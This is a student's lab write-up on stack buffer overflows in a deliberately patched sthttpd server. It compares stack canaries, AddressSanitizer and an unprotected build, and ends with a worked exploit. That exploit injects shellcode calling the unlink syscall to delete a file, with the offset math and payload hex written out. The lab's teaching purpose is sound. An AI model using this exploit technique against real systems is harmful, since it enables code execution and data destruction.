Lab3   Smashinglab
By Haojie Chen
204449491
--------------------------------------------
1.
$ which gcc
This command outputs "/usr/local/cs/bin/gcc", I make sure that /usr/local/cs/bin is at the start of my PATH and I am using the right version of gcc.

$ mkdir lab3
$ cd lab3
$ wget http://web.cs.ucla.edu/classes/fall15/cs33/lab/sthttpd-2.27.0.tar.gz
$ tar -xvzf sthttpd-2.27.0.tar.gz
$ cd sthttpd-2.27.0
Using these commands, I download the original sthttpd 2.27.0 to directory ~/lab3 I just make, and decompress it under this directory, then enter the new directory generated by decompression.


2.
$ cd src
$ emacs thttpd.c
Since there are only two lines that need to be replaced, I manually enter the source code and make these two changes:
- char line[10000];
+ char line[100];

- while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
+ while ( fgets( line, 1000, fp ) != (char*) 0 )

$ cd ..
$ ./configure LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
Under the directory ~/sthttpd-2.27.0, build sthttpd with the patch applied using the above shell command.

$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
$ mv src/thttpd src/thttpd-sp

$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
$ mv src/thttpd src/thttpd-as

$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
$ mv src/thttpd src/thttpd-no
Compile it three times using the make script under three different levels of stack-protection, and call the resulting executables src/thttpd-sp, src/thttpd-as, src/thttpd-no respectively.


3.
$ gdb --args src/thttpd-sp -p 13063 -D
(gdb) r

$ gdb --args src/thttpd-as -p 13064 -D
(gdb) r

$ gdb --args src/thttpd-no -p 13065 -D
(gdb) r
On SEASnet GNU/Linux server 09, run each of the modified sthttpd daemons under
GDP on port 13063, 13064 and 13065 respectively. The port number is calculated
from (12330 + 3 * (204449491 % 293) + Y), where Y is 1, 2, 3 for SP, AS and NO.
The server hangs.

4.
To verify the web servers work in the normal case, use the following command:
$ src/thttpd-sp -p 13063 -D

The shell lauches the server will appear to hang, then I open a new console and
request a text file in the working directory of my HTTPD server called foo.txt,
which contains only one line "hello world" in it:
$ curl http://localhost:13063/foo.txt
If it prints out "hello world", it means the server works.

Then do the same to the other two servers:
$ src/thttpd-sp -p 13064 -D
$ curl http://localhost:13064/foo.txt

$ src/thttpd-sp -p 13065 -D
$ curl http://localhost:13065/foo.txt


5. 
Under directory ~/src, I create a text file called config.txt, which contains
the content that can cause stack corruption. After I examine the read_config
function in the source code of thttpd, I figure out that the fgets in it takes
string in the format "name=value name=value....", and stores the characters
in char line[100]. So if I use fgets to take in more than 100 bytes, it will
overflow the buffer and make a mess.
Run the following command:
$ src/thttpd-sp -p 13063 -D -C src/config.txt

-C src/config.txt runs the server with the configuration file "config.txt"
created by me. This way the server crashes and the shell gives this message:
*** stack smashing detected ***: src/thttpd-sp terminated
Segmentation fault

Then, I run the server under gdb:
$ gdb --args src/thttpd-sp -p 13063 -D -C src/config.txt
(gdb) r

When the server crashes and terminated, I use
(gdb) bt
to get a backtrace like this:
#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
#6  0x0000000000405042 in read_config (filename=<optimized out>)
    at thttpd.c:1190
#7  0x310074726f700031 in ?? ()
#8  0x00310074726f7000 in ?? ()
#9  0x7000310074726f70 in ?? ()
#10 0x6f7000310074726f in ?? ()
#11 0x726f700031007472 in ?? ()
#12 0x74726f7000310074 in ?? ()
#13 0x0074726f70003100 in ?? ()
#14 0x310074726f700031 in ?? ()
#15 0x00310074726f7000 in ?? ()
#16 0x7000310074726f70 in ?? ()
#17 0x6f7000310074726f in ?? ()
#18 0x726f700031007472 in ?? ()
#19 0x74726f7000310074 in ?? ()
#20 0x0074726f70003100 in ?? ()
#21 0x310074726f700031 in ?? ()

The -fstack-protector-strong option set canaries before and after the buffer.
The upper canary is pushed right after the function return pointer has been
pushed. Then before the function returns, the canaries must be checked to
ensure there is no buffer overflow. Looking at the backtrace, the instructions
executed after __stack_chk_fail () is called all happens after the stack buffer
overflow is detected. So the last instructions of read_config must contain
the code that checks the canary. Running under gdb, I set a break point at
read_config, then step into the function and break again at fclose. Then step
into fclose(), use s until I find these instructions:
0x0000000000404f0f <read_config+1231>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
0x0000000000404f14 <read_config+1236>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
0x0000000000404f1d <read_config+1245>:	0f 85 1a 01 00 00 jne    0x40503d <read_config+1533>
These instructions cause the program to crash. It moves the value of 0x68(%rsp)
to %rax, (this value is the current canary value), then compare it to the original
canary value (%fs:0x28). If they are different, it means stack buffer overflow occurs,
it jumps to an instruction that calls the __stack_chk_fail () which crashes the program.



6.
Similar for AS, I use the same config.txt to make it crash:
$ src/thttpd-as -p 13064 -D -C src/config.txt

The crash message:
=================================================================
==28350==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffe234dcef4 at pc 0x00000045a418 bp 0x7ffe234dce50 sp 0x7ffe234dc600
READ of size 450 at 0x7ffe234dcef4 thread T0
ASAN:SIGSEGV
==28350==AddressSanitizer: while reporting a bug found another one. Ignoring.

Running under gdb:
$ gdb --args src/thttpd-as -p 13064 -D -C src/config.txt
(gdb) r
(gdb) bt

Get a backtrace like the following:
#0  0x00007ffff7073128 in ?? () from /lib64/libgcc_s.so.1
#1  0x00007ffff7074029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
#2  0x000000000048a416 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
    this=0x7fffffffbc80, pc=4563992, max_depth=<optimized out>)
    at ../../../../gcc-5.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_posix_libcdep.cc:113
#3  0x0000000000486892 in __asan::GetStackTraceWithPcBpAndContext (fast=false,
    context=0x0, bp=140737488342336, pc=<optimized out>, max_depth=256,
    stack=<optimized out>)
    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_stack.h:43
#4  __asan_report_error (pc=<optimized out>, bp=bp@entry=140737488342336,
    sp=sp@entry=140737488340208, addr=addr@entry=140737488342500,
        is_write=is_write@entry=0, access_size=access_size@entry=450)
	    at ../../../../gcc-5.2.0/libsanitizer/asan/asan_report.cc:1006
#5  0x000000000045a433 in __interceptor_strchr (
    str=str@entry=0x7fffffffcd80 "port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1
    port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1
    port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port"..., c=c@entry=35)
        at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
#6  0x00000000004b1e01 in read_config (filename=<optimized out>)
    at thttpd.c:1018
#7  0x20313d74726f7020 in ?? ()
#8  0x7020313d74726f70 in ?? ()
#9  0x6f7020313d74726f in ?? ()
#10 0x726f7020313d7472 in ?? ()
#11 0x74726f7020313d74 in ?? ()
#12 0x3d74726f7020313d in ?? ()
#13 0x313d74726f702031 in ?? ()
#14 0x20313d74726f7020 in ?? ()
#15 0x7020313d74726f70 in ?? ()
#16 0x6f7020313d74726f in ?? ()
#17 0x726f7020313d7472 in ?? ()
#18 0x74726f7020313d74 in ?? ()
#19 0x3d74726f7020313d in ?? ()
#20 0x313d74726f702031 in ?? ()
#21 0x20313d74726f7020 in ?? ()
#22 0x7020313d74726f70 in ?? ()
#23 0x6f7020313d74726f in ?? ()
#24 0x726f7020313d7472 in ?? ()
#25 0x74726f7020313d74 in ?? ()
#26 0x3d74726f7020313d in ?? ()
#27 0x313d74726f702031 in ?? ()
#28 0x20313d74726f7020 in ?? ()
#29 0x7020313d74726f70 in ?? ()
#30 0x6f7020313d74726f in ?? ()
#31 0x726f7020313d7472 in ?? ()
#32 0x74726f7020313d74 in ?? ()
#33 0x3d74726f7020313d in ?? ()
#34 0x313d74726f702031 in ?? ()
#35 0x20313d74726f7020 in ?? ()
#36 0x000000000000000a in ?? ()
#37 0x0000000000000000 in ?? ()

Address Sanitizer maps eachh address in memory to a byte that records its status
in shadow mamory. It checks if the memory is poisoned(unaccesible) when it is going
to be used, the "interceptor" seems to do this job. In the assembly code of AS, I
find that when the sanitizer detects poisoned memory is being accessed, it calls
__asan_report_load8, which use  __asan_report_error to generate "segementation fault"
report and some instruction inside the later called function aborts the program.




7.
Similar for NO, I use the same config.txt to make it crash:
$ src/thttpd-no -p 13065 -D -C src/config.txt

The crash message:
Segmentation fault

Running under gdb:
$ gdb --args src/thttpd-no -p 13065 -D -C src/config.txt
(gdb) r
(gdb) bt

Get a backtrace like the following:
    #0  0x0000000000404d8b in read_config (filename=<optimized out>)
    at thttpd.c:1190
    #1  0x310074726f700031 in ?? ()
    #2  0x00310074726f7000 in ?? ()
    #3  0x7000310074726f70 in ?? ()
    #4  0x6f7000310074726f in ?? ()
    #5  0x726f700031007472 in ?? ()
    #6  0x74726f7000310074 in ?? ()
    #7  0x0074726f70003100 in ?? ()
    #8  0x310074726f700031 in ?? ()
    #9  0x00310074726f7000 in ?? ()
    #10 0x7000310074726f70 in ?? ()
    #11 0x6f7000310074726f in ?? ()
    #12 0x726f700031007472 in ?? ()
    #13 0x74726f7000310074 in ?? ()
    #14 0x0074726f70003100 in ?? ()
    #15 0x310074726f700031 in ?? ()
    #16 0x00310074726f7000 in ?? ()
    #17 0x7000310074726f70 in ?? ()
    #18 0x6f7000310074726f in ?? ()
    #19 0x726f700031007472 in ?? ()
    #20 0x74726f7000310074 in ?? ()
    #21 0x0074726f70003100 in ?? ()

NO does not have any stack buffer overflow protection. When running it under gdb and
checking the assembly code, I find it crashes right after the "retq" insruction. 
The program takes in the bytes I write in config.txt, which overwrite the original
return address. So when read_config finishes and tries to retuurn, it accesses the
wrong memory address(which is bunch of port=1 .... in config.txt) that causes the
program to crash.


8.
Generate the assembly language code for thttpd.c three times and get three assembly files
for each variant:
$ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
$ gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
$ gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s

Then I use emacs to open each file and compare their implementations of handle_read function.
The assembly code of SP and NO are very similar. Since NO does not have a special stack protection
technique, it just let overflow happen and mess around. SP, with the flag -fstack-protector-strong,
adds canaries before the beginning and after the end of the buffer that we want to protect.
The program checks the canaries' values right before the function returns to make sure that they
do not get changes. If the values are different with the original values, it means stack buffer
overflow or underflow occurs and the canaries are overwritten, and likely the return address would
be overwritten. When this is detected, it prints out error message and aborts the program.

The AS version is different becasue it uses a different technique--shadow memory. The status of
each memory address is being mapped as a byte in shadow memory. In its assembly code, it checks for
shadow memory to make sure if a memory is poisoned when this memory is being accessed. If an
unaccessible(poinsoned) memory is being accessed, it will reports "stack is smashed" and aborts
the program.


************
*   9      *
************
This part of the lab is the higher-level version of the previous stack smashing tasks.
Without any stack protection techniques, I need to cause stack buffer overflow and
overwrite the return address to something else that I want the program to do.

In x86-64, there is a syscall that can unlink the file, which is what we want--deleting the
file from the working directory. I decide to use this syscall and create an exploit.txt that
contains these instructions that can unlink target.txt.

Since fgets reads and stores characters by their hex value in memory, if I want to store
a specific sequence of hex bytes(bytes of instructions) in memory, I need to find their
raw values first, so that when fgets reads in their raw values, it can convert them into
the desired hex bytes and stores them in memory.

My exploit starts with characters "port=" since this way it can be accepted by read_config
and be stored in line[], which is the buffer we want to overwrite.
Use $ xxd port.txt, I get the hex dump (raw values) for "port=" is:
706f72743d

Since syscall unlink takes in a char* as argument, (it is the address of the string of file name),
I need to store "target.txt\0" on the stack in order to get the address of it.
I decide to put it after "port=".
The hex dump for "target.txt\0" is:
7461726765742E74787400

In order to locate the relative address of "target.txt\0", I need to know the buffer size (distance
from the beginning of the buffer to return address).
I first compile thttpd.c with "-z execstack" in order to turn NX bit off so that we can execute what
we write onto the stack:
$ make clean
$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -z execstack'
$ mv thttpd thttpd-ex

Then I run it with -C and config.txt under gdb:
$ gdb --args src/thttpd-ex -p 13065 -D -C src/config.txt

I set breaks at read_config and and fclose. After stepping into read_config, I use "(gdb) p &line"
to get the address of beginning of the buffer: 0x00007fffffffcee0.
Then I use "continue" and get to fclose, step into it and "si" each instruction until it gets to
return. The address of return address is 0x7fffffffcf78.
The offset is 152 bytes, which means I need to write at least 152 bytes before overwriting the
return address.

When returning, %rsp will be pointing at the return address, which means if I want to return to
some instructions I write on the stack, and these instructions are after "target.txt\0", the
address of the beginning of the instructions would be (0x00007fffffffcee0+0x10)=0x7fffffffcef0.
After returning, %rsp will be pointing at offset (152+8), which means the address of "target.txt\0"
is at %rsp - (152+8-5) = -9B(%rsp).

Then get to the instruction part, I write an assembly file inject.s:
lea -0x9B(%rsp), %rdi
mov $0x57, %rax
syscall
----------------------
When syscall is invoked, the program will check the value in %rax to decide which syscall to use.
For unlink, the value needs to be in %rax is 0x57. Also, as the holder for argument, we put
the address of string "target.txt\0" in %rdi, which is 0x9B(%rsp).
Then I compile the file with -c to get the object file and look at the raw values of the instructions:
$ gcc -c inject.s
$ objdump -d inject.o
------------------------------------------------
The hex dump for instructions is:
909090488dbc2465ffffff48c7c0570000000f05
*Notice that the three 90s are "nop" instructions, does nothing.*

Then I append all these hex dump to file raw.txt. In order to make the converted hex bytes 152
bytes, I append extra 30s (30 is 0's hex value) to fill the file. In the end, I append the hex dump
of the desired return address(reversed, since the compiler reads the return address in big endian
way): f0ceffffff7f0000.

Finally, I use "$ xxd -r raw.txt >> exploit.txt" to get the hex bytes we want fgets to read in.
Actually, I find xxd can only translate 16 bytes at a time, so I divide these hex dump into
different files and translate them one by one then append them to exploit.txt.
Running under gdb:
$ gdb --args src/thttpd-ex -p 13065 -D -C src/exploit.txt

It successfully deletes the file target.txt in working directory.

*****Notice: The exploit only works via gdb, since ASLR is disable in gdb. When running outside gdb
environment, it doesn't work because of the address space layour randomization. We could get a
different line[] address each time.
